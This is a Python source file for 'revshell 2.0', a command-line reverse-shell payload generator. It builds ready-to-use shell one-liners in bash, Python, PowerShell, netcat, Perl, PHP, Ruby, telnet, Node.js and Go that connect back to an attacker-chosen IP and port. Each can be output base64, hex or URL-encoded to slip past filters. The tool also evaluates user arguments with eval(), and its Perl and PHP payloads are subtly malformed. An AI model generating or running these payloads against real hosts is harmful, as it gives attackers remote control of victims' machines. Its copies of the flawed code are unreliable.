import argparse
from urllib.parse import quote
from base64 import b64encode
import binascii

def banner():
    return """
 (                                       
 )\ )                    )       (   (   
(()/(   (    )        ( /(    (  )\  )\  
 /(_)) ))\  /((   (   )\())  ))\((_)((_) 
(_))  /((_)(_))\  )\ ((_)\  /((_)_   _   
| _ \(_))  _)((_)((_)| |(_)(_)) | | | |  
|   // -_) \ V / (_-<| ' \ / -_)| | | |  
|_|_\\___|  \_/  /__/|_||_|\___||_| |_|  
                        Autor: João Victor
                                            
"""


class Encode():
    
    def __init__(self:object,payload:str):
        self.__payload = payload
    
    def shell(self):
        return self.__payload
    
    def urlencode(self):
        return quote(self.__payload)
    
    def base64(self):
        messagebytes = bytes(self.__payload,"utf-8")
        return b64encode(messagebytes)
    
    def hexadecimal(self):
        messagebytes = bytes(self.__payload,"utf-8")
        return binascii.hexlify(messagebytes)


class Bash(Encode):

    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = f"bash -c 'exec bash -i &>/dev/tcp/{self.__ip}/{self.__porta} <&1'"
        super().__init__(self.__payload)


class Python(Encode):

    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.__ip}\",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
        super().__init__(self.__payload)


class Powershell(Encode):

    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('"+self.__ip+"',"+self.__porta+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        super().__init__(self.__payload)


class Netcat(Encode):
    
    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = f"nc -vn {self.__ip} {self.__porta} -e \"/bin/bash\""
        super().__init__(self.__payload)


class Perl(Encode):
    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = "perl -e 'use Socket;$i=\"$ENV{"+self.__ip+"}"+";$p=$ENV{"+self.__porta+"};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        super().__init__(self.__payload)

class PHP(Encode):
    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = f"php -r '$sock=fsockopen(getenv({self.__ip}),getenv({self.__porta}));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        super().__init__(self.__payload)

class Ruby(Encode):
    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = f"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{self.__ip}\",{self.__porta}))'"
        super().__init__(self.__payload)

class Telnet(Encode):
    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = f"TF=$(mktemp -u);mkfifo $TF && telnet {self.__ip} {self.__porta} 0<$TF | sh 1>$TF"
        super().__init__(self.__payload)

class NodeJs(Encode):
    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = f"require('child_process').exec('nc -e sh {self.__ip} {self.__porta}')"
        super().__init__(self.__payload)


class Golang(Encode):
    def __init__(self:object,ip:str,porta:str):
        self.__ip = ip
        self.__porta = porta
        self.__payload = "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\""+self.__ip+":"+self.__porta+"\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
        super().__init__(self.__payload)


class Argumentos():
    global args
    parser = argparse.ArgumentParser(prog=banner(),usage="python3 revshell.py -ip 192.168.4.80 -port 4444 -payload bash -encode urlencode")
    parser.add_argument('--version',action='version', version='revshell 2.0')
    parser.add_argument("-ip",type=str, dest="ip",action="store",help="Insert ip",required=True)
    parser.add_argument("-port",type=str,dest="porta",action="store",help="Insert port",required=True)
    parser.add_argument("-payload",type=str,dest="payload",action="store",choices=["bash","python","powershell","nc","php","perl","ruby","telnet","nodejs","golang"],help="Insert payload",required=True)
    parser.add_argument("-encode",type=str,dest="encode",action="store",choices=['base64',"hexadecimal","urlencode","shell"],help="Insert encode",default=None)
    args = parser.parse_args()

if __name__ == "__main__":
    match args.payload:
        case "bash":
            match args.encode:
                case "urlencode" | "hexadecimal" | "base64" | "shell":
                    print(eval(f"Bash(\"{args.ip}\",\"{args.porta}\").{args.encode}()"))
        case "python":
            match args.encode:
                case "urlencode" | "hexadecimal" | "base64" | "shell":
                    print(eval(f"Python(\"{args.ip}\",\"{args.porta}\").{args.encode}()"))
        case "powershell":
            match args.encode:
                case "urlencode" | "hexadecimal" | "base64" | "shell":
                    print(eval(f"Powershell(\"{args.ip}\",\"{args.porta}\").{args.encode}()"))
        case "nc":
            match args.encode:
                case "urlencode" | "hexadecimal" | "base64" | "shell":
                    print(eval(f"Netcat(\"{args.ip}\",\"{args.porta}\").{args.encode}()"))
        case "perl":
            match args.encode:
                case "urlencode" | "hexadecimal" | "base64" | "shell":
                    print(eval(f"Perl(\"{args.ip}\",\"{args.porta}\").{args.encode}()"))
        case "php":
            match args.encode:
                case "urlencode" | "hexadecimal" | "base64" | "shell":
                    print(eval(f"PHP(\"{args.ip}\",\"{args.porta}\").{args.encode}()"))
        case "ruby":
            match args.encode:
                case "urlencode" | "hexadecimal" | "base64" | "shell":
                    print(eval(f"Ruby(\"{args.ip}\",\"{args.porta}\").{args.encode}()"))
        case "telnet":
            match args.encode:
                case "urlencode" | "hexadecimal" | "base64" | "shell":
                    print(eval(f"Telnet(\"{args.ip}\",\"{args.porta}\").{args.encode}()"))
        case "nodejs":
            match args.encode:
                case "urlencode" | "hexadecimal" | "base64" | "shell":
                    print(eval(f"NodeJs(\"{args.ip}\",\"{args.porta}\").{args.encode}()"))
        case "golang":
            match args.encode:
                case "urlencode" | "hexadecimal" | "base64" | "shell":
                    print(eval(f"Golang (\"{args.ip}\",\"{args.porta}\").{args.encode}()"))